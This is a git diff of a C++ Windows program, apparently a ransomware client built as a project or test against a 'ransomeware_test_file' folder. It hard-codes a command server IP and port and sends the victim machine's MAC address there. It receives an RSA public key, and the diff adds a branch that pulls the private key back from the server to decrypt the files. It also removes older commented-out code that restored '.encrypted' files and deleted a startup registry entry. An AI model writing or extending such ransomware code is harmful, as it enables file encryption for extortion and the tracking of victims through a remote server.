@@ -18,11 +18,11 @@ using namespace std;
 
 LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
 
-// #pragma comment(linker, "/entry:wWinMainCRTStartup /subsystem:console")
+#pragma comment(linker, "/entry:wWinMainCRTStartup /subsystem:console")
 #pragma comment(lib, "libssl.lib")
 #pragma comment(lib, "libcrypto.lib")
 HWND hEdit;
-const string SERVER_IP = "3.35.13.136";
+const string SERVER_IP = "3.36.117.40";
 const int SERVER_PORT = 54000;
 #define IDC_MAIN_BUTTON	101			// Button identifier
 #define IDC_MAIN_EDIT	102			// Edit box identifier
@@ -74,13 +74,11 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
         return -3;
     }
 
-    // MAC 주소 가져오기
+    // MAC 주소 전송
     string wifiMacAddress = getMacAddress();
-    // 서버로 MAC 주소 전송
     send(clientSocket, wifiMacAddress.c_str(), wifiMacAddress.size(), 0);
 
     // start 인경우 -> 공개키 저장
-    // TOOD : end인 경우 -> 개인키 저장
     send(clientSocket, "start", sizeof("start"), 0);
 
     // 서버로부터 공개키 수신
@@ -93,6 +91,9 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
         WSACleanup();
         return -4;
     }
+    WSACleanup();
+    closesocket(clientSocket);
+
     HANDLE hFile = CreateFile(L"public_key.der", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         std::cerr << "Failed to create file." << std::endl;
@@ -276,45 +277,85 @@ LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
 			SendMessage(hEdit, WM_GETTEXT, sizeof(buffer) / sizeof(buffer[0]), reinterpret_cast<LONG_PTR>(buffer));
             std::wstring wkey = std::wstring((wchar_t*)buffer);
             std::string key(wkey.begin(), wkey.end());
-            cout << key << "\n";
 
-
-            /*
-            Crypto Crypto(key);
-
-            //Checks to see if the key is correct
-            if (Crypto.checkKey(FileIO::readFile((std::wstring)tempPath).at(0)))
-            {
-
-                std::vector<std::wstring> fileLocations;
-                //Looks for all encrypted files
-                FileSearch::searchDir(fileLocations, docPath, (wchar_t*)L".encrypted");
-                //Same process as encrypt but in reverse
-                for (std::wstring& path : fileLocations)
-                {
-                    std::vector<std::string> data = FileIO::readFile(path);
-                    Crypto.decrypt(data);
-                    FileIO::removeFile(path);
-                    //Removes the encrypted extension and saves decrypted data
-                    FileIO::saveFile(path.erase(path.size() - 10), data);
+            if (key == "end") {
+                // 소켓 초기화
+                WSADATA wsaData;
+                if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+                    std::cerr << "WSAStartup failed!" << std::endl;
+                    return -1;
                 }
-                //Removes encrypted files
-                FileIO::removeFile((std::wstring)tempPath);
-                //Removes startup registry
-                Registry::RemoveProgram();
-                //Sends message to user that the process was successfully complete
-                MessageBox(NULL, L"Files Succesfully Decrypted", L"Information", MB_ICONINFORMATION);
-                //Quits the program
-                PostQuitMessage(0);
+                // 소켓 생성
+                SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+                if (clientSocket == INVALID_SOCKET) {
+                    std::cerr << "Can't create a socket! Quitting" << std::endl;
+                    WSACleanup();
+                    return -2;
+                }
+                // 서버 연결
+                sockaddr_in hint;
+                hint.sin_family = AF_INET;
+
+                hint.sin_port = htons(SERVER_PORT);
+                inet_pton(AF_INET, SERVER_IP.c_str(), &hint.sin_addr);
+
+                int connectResult = connect(clientSocket, (sockaddr*)&hint, sizeof(hint));
+                if (connectResult == SOCKET_ERROR) {
+                    std::cerr << "Can't connect to server! Quitting" << std::endl;
+                    closesocket(clientSocket);
+                    WSACleanup();
+                    return -3;
+                }
+
+                // MAC 주소 가져오기
+                string wifiMacAddress = getMacAddress();
+                // 서버로 MAC 주소 전송
+                send(clientSocket, wifiMacAddress.c_str(), wifiMacAddress.size(), 0);
+
+                // start 인경우 -> 공개키 저장
+                // TOOD : end인 경우 -> 개인키 저장
+                send(clientSocket, "end", sizeof("end"), 0);
+
+                // 서버로부터 공개키 수신
+                unsigned char privateKeyBuf[1192];
+                // TODO : 받아온 사이즈 중에서 CC 인 부분은 자를 수 있도록
+                int privateKeyLen = recv(clientSocket, reinterpret_cast<char*>(privateKeyBuf), 1192, 0);
+                for (int i = 0; i < 1192; i++) {
+                    printf("%02x", privateKeyBuf[i]);
+                }
+                if (privateKeyLen <= 0) {
+                    std::cerr << "Failed to receive public key from server! Quitting" << std::endl;
+                    closesocket(clientSocket);
+                    WSACleanup();
+                    return -4;
+                }
+                WSACleanup();
+                closesocket(clientSocket);
+
+                // 받아온 공개키 저장
+                HANDLE hFile = CreateFile(L"private_key.der", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                if (hFile == INVALID_HANDLE_VALUE) {
+                    std::cerr << "Failed to create file." << std::endl;
+                    return 0;
+                }
+                DWORD bytesWritten;
+                if (!WriteFile(hFile, privateKeyBuf, sizeof(privateKeyBuf), &bytesWritten, NULL)) {
+                    std::cerr << "Failed to write to file." << std::endl;
+                    CloseHandle(hFile);
+                    return 0;
+                }
+                CloseHandle(hFile);
+
+                string filename = "C:\\Users";
+                string userName = getUserName();
+                filename += "\\" + userName + "\\ransomeware_test_file";
+
+                RSA* priKey = getPriKey();
+                DecryptDir(priKey, filename);
+                RSA_free(priKey);
+
                 return 0;
             }
-            else
-            {
-                //Warns the user they entered an incorrect key
-                MessageBox(NULL, L"Incorrect Key", L"Warning", MB_ICONWARNING);
-            }
-            */
-            
         }
         break;
         }
